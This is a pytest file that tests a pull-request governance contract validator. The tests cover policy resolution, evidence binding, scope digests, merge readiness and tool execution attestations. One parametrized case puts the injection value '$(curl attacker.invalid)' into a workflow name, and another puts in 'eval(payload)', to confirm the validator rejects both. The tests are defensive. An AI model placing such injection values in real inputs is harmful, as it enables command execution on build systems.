from __future__ import annotations

import copy
import json
from pathlib import Path
from typing import Callable

import pytest

from pr_inspector.aigov_errors import AIGOVValidationError
from pr_inspector.aigov_models import is_validated_aigov_contract
from pr_inspector.aigov_schema_registry import CONTRACT_TYPES
from pr_inspector.aigov_validation import (
    AIGOVValidationContext,
    canonical_scope_digest,
    load_aigov_contract,
    validate_aigov_contract,
)


ROOT = Path(__file__).resolve().parents[1]
VALID = ROOT / "tests/fixtures/aigov/v2.5.0/schema_valid"
SEMANTIC_VALID = ROOT / "tests/fixtures/aigov/v2.5.0/semantic_valid/cases.json"
SEMANTIC_INVALID = ROOT / "tests/fixtures/aigov/v2.5.0/semantic_invalid/cases.json"
HEAD = "1" * 40


def _fixture(contract: str) -> dict:
    value = json.loads((VALID / f"{contract}.json").read_text(encoding="utf-8"))
    assert isinstance(value, dict)
    return value


def _codes(contract: str, payload: dict, **kwargs: object) -> set[str]:
    return {
        item.code
        for item in validate_aigov_contract(contract, payload, **kwargs)
    }


def _evidence(evidence_id: str, *, exact_identity: str = "auxiliary-evidence") -> dict:
    return {
        "evidence_id": evidence_id,
        "evidence_type": "structured_record",
        "exact_identity": exact_identity,
        "source_digest": "sha256:" + "9" * 64,
        "retrieval_method": "trusted_record_reference",
    }


def test_semantic_fixture_manifests_are_exact_and_declared() -> None:
    valid = json.loads(SEMANTIC_VALID.read_text(encoding="utf-8"))
    invalid = json.loads(SEMANTIC_INVALID.read_text(encoding="utf-8"))
    assert tuple(item["contract_type"] for item in valid["cases"]) == CONTRACT_TYPES
    assert {item["contract_type"] for item in invalid["cases"]} == set(CONTRACT_TYPES)
    assert len(valid["cases"]) == 12
    assert len(invalid["cases"]) >= 24


def test_every_contract_has_a_semantically_valid_immutable_model() -> None:
    for contract in CONTRACT_TYPES:
        payload = _fixture(contract)
        model = load_aigov_contract(contract, payload)
        assert is_validated_aigov_contract(model)
        assert model.activation_state == "inactive"


def test_repository_policy_rejects_inactive_verified_enforcement() -> None:
    payload = _fixture("repository_review_policy")
    payload["lifecycle_state"] = "superseded"
    payload["repository_hosted_enforcement_claim"] = "verified"
    payload["repository_hosted_enforcement_evidence_ref"] = _evidence("ruleset-1")
    assert "AIGOV-SEM-101" in _codes("repository_review_policy", payload)


def test_repository_policy_active_state_requires_effective_transition() -> None:
    payload = _fixture("repository_review_policy")
    payload["lifecycle_state"] = "active"
    payload["transition_record_ref"] = None
    assert "AIGOV-MODEL-003" in _codes("repository_review_policy", payload)


def test_resolution_rejects_downgrade_and_self_reference() -> None:
    payload = _fixture("review_policy_resolution")
    context = AIGOVValidationContext(
        minimum_inspection_profile="strict",
        minimum_evidence_profile="high_assurance",
        minimum_merge_enforcement_profile="repository_enforced",
    )
    codes = _codes("review_policy_resolution", payload, context=context)
    assert {"AIGOV-SEM-016", "AIGOV-SEM-017", "AIGOV-SEM-018"} <= codes

    payload = _fixture("review_policy_resolution")
    payload["activated_conditions"] = [
        {
            "record_type": "review_policy_resolution",
            "record_id": payload["resolution_id"],
            "record_digest": "sha256:" + "8" * 64,
        }
    ]
    assert "AIGOV-SEM-111" in _codes("review_policy_resolution", payload)


def test_duplicate_evidence_identity_fails_closed() -> None:
    payload = _fixture("review_policy_resolution")
    duplicate = copy.deepcopy(payload["evidence_refs"][0])
    duplicate["exact_identity"] = "different-source"
    payload["evidence_refs"].append(duplicate)
    assert "AIGOV-SEM-007" in _codes("review_policy_resolution", payload)


def test_obligation_enforcement_progression_is_monotonic() -> None:
    payload = _fixture("obligation_authority_binding")
    payload["current_enforcement_status"] = "ci_enforced"
    payload["ci_evidence_ref"] = None
    assert "AIGOV-MODEL-003" in _codes("obligation_authority_binding", payload)

    payload = _fixture("obligation_authority_binding")
    payload["fixture_evidence_ref"]["exact_identity"] = (
        "tests/fixtures/aigov/v2.5.0/schema_valid"
    )
    assert "AIGOV-SEM-122" in _codes("obligation_authority_binding", payload)


def test_classification_requires_bound_evidence_and_unique_fact_identity() -> None:
    payload = _fixture("classification_record")
    payload["observed_facts"][0]["evidence_ref"]["evidence_id"] = "missing"
    assert "AIGOV-SEM-131" in _codes("classification_record", payload)

    payload = _fixture("classification_record")
    duplicate = copy.deepcopy(payload["observed_facts"][0])
    duplicate["fact_value"] = "different.json"
    payload["observed_facts"].append(duplicate)
    assert "AIGOV-SEM-007" in _codes("classification_record", payload)


def test_scope_digest_overlap_and_unresolved_claims_fail_closed() -> None:
    payload = _fixture("scope_record")
    payload["excluded_paths"] = [payload["included_paths"][0]]
    payload["scope_authority_binding_refs"] = [
        {
            "record_type": "obligation_authority_binding",
            "record_id": "scope-authority-1",
            "record_digest": "sha256:" + "7" * 64,
        }
    ]
    payload["scope_digest"] = canonical_scope_digest(payload)
    assert "AIGOV-SEM-144" in _codes("scope_record", payload)

    payload = _fixture("scope_record")
    payload["included_paths"].append("../outside")
    payload["scope_digest"] = canonical_scope_digest(payload)
    assert "AIGOV-SEM-143" in _codes("scope_record", payload)


def test_scope_digest_is_deterministic_and_authority_order_is_preserved() -> None:
    payload = _fixture("scope_record")
    assert payload["scope_digest"] == canonical_scope_digest(payload)
    altered = copy.deepcopy(payload)
    altered["included_paths"].append("docs/**")
    assert canonical_scope_digest(altered) != payload["scope_digest"]


def test_review_execution_cannot_claim_performed_without_tool_evidence() -> None:
    payload = _fixture("review_execution")
    payload["tool_execution_attestation_refs"] = []
    assert "AIGOV-SEM-153" in _codes("review_execution", payload)


def test_review_execution_identity_and_protocol_context_are_exact() -> None:
    payload = _fixture("review_execution")
    context = AIGOVValidationContext(
        repository_full_name="rezahh107/example",
        repository_id=999,
        pr_number=8,
        reviewed_head_sha="2" * 40,
        inspector_commit_sha="3" * 40,
    )
    codes = _codes("review_execution", payload, context=context)
    assert {"AIGOV-SEM-012", "AIGOV-SEM-013", "AIGOV-SEM-014", "AIGOV-SEM-010"} <= codes


def test_receipt_core_cannot_mint_publication_or_break_supersession() -> None:
    payload = _fixture("review_receipt_core")
    payload["sequence_number"] = 2
    assert "AIGOV-SEM-162" in _codes("review_receipt_core", payload)

    payload = _fixture("review_receipt_core")
    payload["published_at"] = "2026-07-18T12:00:00Z"
    assert "AIGOV-MODEL-003" in _codes("review_receipt_core", payload)


def test_publication_attempt_preserves_core_and_idempotency_identity() -> None:
    payload = _fixture("publication_attempt")
    payload["idempotency_key"]["pr_number"] = 8
    assert "AIGOV-SEM-171" in _codes("publication_attempt", payload)

    payload = _fixture("publication_attempt")
    payload["receipt_core_mutation"] = {"technical_status": "GREEN_TECHNICALLY_READY"}
    assert "AIGOV-MODEL-003" in _codes("publication_attempt", payload)


def test_target_policy_cannot_evaluate_its_own_transition() -> None:
    payload = _fixture("policy_transition_record")
    payload["evaluation_policy_identity"] = payload["target_policy_identity"]
    assert "AIGOV-SEM-182" in _codes("policy_transition_record", payload)


def test_progressed_policy_transition_requires_owner_and_exact_main_evidence() -> None:
    payload = _fixture("policy_transition_record")
    payload["post_merge_closure_status"] = "merge_result_verified"
    assert {"AIGOV-SEM-183", "AIGOV-SEM-184"} <= _codes(
        "policy_transition_record", payload
    )


def test_technical_green_cannot_directly_authorize_merge() -> None:
    payload = _fixture("merge_readiness_record")
    payload["technical_status_ref"]["record_type"] = "GREEN_TECHNICALLY_READY"
    assert "AIGOV-SEM-191" in _codes("merge_readiness_record", payload)


def test_non_ready_merge_result_requires_explanation() -> None:
    payload = _fixture("merge_readiness_record")
    payload["merge_readiness_result"] = "NOT_READY"
    payload["merge_authorization_state"] = "not_authorized"
    assert "AIGOV-SEM-194" in _codes("merge_readiness_record", payload)


def test_squash_merge_does_not_require_source_branch_ancestry() -> None:
    payload = _fixture("post_merge_closure")
    payload["detected_merge_method"] = "squash_merge"
    payload["history_topology_result"] = (
        "history_topology_not_preserved_by_merge_method"
    )
    payload["closure_outcomes"] = [
        "content_equivalence_verified",
        "history_topology_not_preserved_by_merge_method",
    ]
    assert validate_aigov_contract("post_merge_closure", payload) == ()


def test_closure_rejects_insufficient_evidence_and_content_loss() -> None:
    payload = _fixture("post_merge_closure")
    payload["closure_outcomes"].append("insufficient_evidence")
    assert "AIGOV-SEM-204" in _codes("post_merge_closure", payload)

    payload = _fixture("post_merge_closure")
    payload["closure_outcomes"].append("content_loss_detected")
    assert "AIGOV-SEM-203" in _codes("post_merge_closure", payload)


def test_tool_caller_text_is_not_authenticated_execution() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["authentication_provenance"]["provenance_evidence_ref"][
        "evidence_type"
    ] = "source_document"
    assert "AIGOV-SEM-212" in _codes("tool_execution_attestation", payload)


def test_tool_complete_evidence_claim_requires_pagination_proof() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["execution_result"]["captured_result_fields"].append("all_pages")
    payload["final_claim_bindings"][0]["result_field_refs"] = ["all_pages"]
    payload["pagination_completeness_ref"] = None
    assert "AIGOV-SEM-217" in _codes("tool_execution_attestation", payload)


def test_tool_workflow_presence_and_success_do_not_mint_enforcement_authority() -> None:
    payload = _fixture("tool_execution_attestation")
    model = load_aigov_contract("tool_execution_attestation", payload)
    assert model.contract_type == "tool_execution_attestation"
    assert "merge_authorized" not in model.payload
    assert "repository_hosted_enforcement" not in model.payload


def test_trusted_workflow_revision_is_context_bound() -> None:
    payload = _fixture("tool_execution_attestation")
    context = AIGOVValidationContext(trusted_workflow_revisions=("3" * 40,))
    assert "AIGOV-SEM-211" in _codes(
        "tool_execution_attestation", payload, context=context
    )


@pytest.mark.parametrize(
    ("contract", "mutator", "expected"),
    [
        (
            "review_policy_resolution",
            lambda p: p["target_identity"].__setitem__("reviewed_head_sha", "abc123"),
            "AIGOV-MODEL-003",
        ),
        (
            "review_receipt_core",
            lambda p: p.__setitem__("scope_digest", "sha256:" + "A" * 64),
            "AIGOV-MODEL-003",
        ),
        (
            "tool_execution_attestation",
            lambda p: p["workflow_identity"].__setitem__(
                "workflow_name", "$(curl attacker.invalid)"
            ),
            "AIGOV-SEM-006",
        ),
    ],
)
def test_identity_and_executable_input_mutations_fail(
    contract: str,
    mutator: Callable[[dict], None],
    expected: str,
) -> None:
    payload = _fixture(contract)
    mutator(payload)
    assert expected in _codes(contract, payload)


def test_same_invalid_payload_produces_same_ordered_diagnostics() -> None:
    payload = _fixture("tool_execution_attestation")
    payload["workflow_identity"]["workflow_name"] = "eval(payload)"
    payload["authentication_provenance"]["provenance_evidence_ref"][
        "evidence_type"
    ] = "source_document"
    first = validate_aigov_contract("tool_execution_attestation", payload)
    second = validate_aigov_contract(
        "tool_execution_attestation", copy.deepcopy(payload)
    )
    assert first == second
    assert tuple(item.code for item in first) == tuple(sorted(item.code for item in first))


def test_schema_valid_but_semantically_invalid_inputs_raise_diagnostics() -> None:
    payload = _fixture("policy_transition_record")
    payload["evaluation_policy_identity"] = payload["target_policy_identity"]
    with pytest.raises(AIGOVValidationError) as caught:
        load_aigov_contract("policy_transition_record", payload)
    assert "AIGOV-SEM-182" in {item.code for item in caught.value.diagnostics}
